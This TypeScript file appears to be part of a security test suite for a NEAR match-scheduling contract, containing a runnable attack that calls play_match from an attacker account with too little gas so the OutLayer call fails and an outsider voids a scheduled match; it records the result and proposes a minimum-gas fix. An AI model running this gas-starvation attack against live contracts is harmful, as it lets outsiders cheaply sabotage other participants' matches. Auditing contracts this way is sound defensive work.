// 13 (extra). Low-gas play_match: anyone may call play_match, and the match is one-shot.
// With just enough gas for play_match + the 40 Tgas on_match callback, OutLayer's
// request_execution gets almost nothing, fails, and on_match voids the match
// (callback_failed). If that works, any outsider can void any scheduled match for ~0.02 NEAR.
import { actions } from 'near-api-js';
import { row, type Attack } from '../lib/attack.ts';
import { ATTACKER, CONTRACT, TGAS, milliNear, send, sleep } from '../lib/near.ts';
import { allMatches, loadPlan, loadState, agentId, findMatch, type Match } from '../lib/season.ts';
import type { AttackResult } from '../lib/results.ts';

export const F2 =
  'F2: play_match has no minimum prepaid-gas check. An outsider who attaches just enough gas for play_match + the 40 Tgas on_match callback starves OutLayer, the call fails and the one-shot match is voided (callback_failed). Anyone can void any scheduled match (e.g. all of a rival\'s matches → rival unranked) for ~0.02 NEAR each. Fix: require!(env::prepaid_gas() >= Gas::from_tgas(250)) (or a computed floor: callback 40 + OutLayer ~150 + own) in play_match.';

export const lowGasPlay: Attack = {
  name: 'low-gas-play',
  kind: 'season',
  attack: 13,
  summary: 'play_match with starved gas: does the one-shot match get voided by an outsider?',
  async run() {
    const st = loadState();
    if (st.season_id === null) return [];
    const sid = st.season_id;
    const ms = await allMatches(sid);
    // Sacrifice a match of the mismatch entry (its result is a fixed F anyway).
    const mism = agentId(loadPlan().agents.find((a) => a.roles.includes('mismatch'))!.name);
    const pick = (): Match | undefined => ms.find((m) => m.status === 'scheduled' && (m.a === mism || m.b === mism)) ?? ms.find((m) => m.status === 'scheduled');
    const target = pick();
    const rows: AttackResult[] = [];
    if (!target) return rows;
    const tries = (process.env.ATK_LOW_GAS_TGAS ?? '50,60,75').split(',').map((x) => BigInt(x));
    for (const g of tries) {
      const o = await send(ATTACKER, CONTRACT, [actions.functionCall('play_match', { season_id: sid, a: target.a, b: target.b }, g * TGAS, milliNear(20))]);
      let m = findMatch(await allMatches(sid), target.a, target.b)!;
      for (let i = 0; i < 20 && m.status === 'pending'; i++) {
        await sleep(5000);
        m = findMatch(await allMatches(sid), target.a, target.b)!;
      }
      const outlayer = o.receipts.filter((r) => r.executor === 'outlayer.testnet');
      const voided = m.status === 'void' || m.status === 'refunded';
      const accepted = m.status !== 'scheduled';
      rows.push(
        row({
          id: `13-${g}`,
          attack: 13,
          script: 'low-gas-play',
          title: `Outsider play_match with ${g} Tgas (${target.match_key.split(':').slice(1).map((x) => x.split('.')[0]).join(' vs ')})`,
          expected: 'refused for too little gas, or the match is played normally (never voided by an outsider)',
          actual: `tx ${o.ok ? 'ok' : `failed: ${o.error}`}; OutLayer receipts ${outlayer.map((r) => (r.ok ? 'ok' : `FAILED (${r.failure?.slice(0, 80)})`)).join(', ') || 'none'}; match now ${m.status}${m.void_reason ? ` (${m.void_reason})` : ''}`,
          pass: !voided,
          finding: voided ? F2 : undefined,
          tx: o.txHash,
          details: { match_key: target.match_key, gas_tgas: Number(g), receipts: o.receipts.map((r) => ({ executor: r.executor, gas: r.gas_burnt, ok: r.ok, failure: r.failure })) },
        }),
      );
      if (accepted) break; // one-shot: the match is consumed either way
    }
    return rows;
  },
};
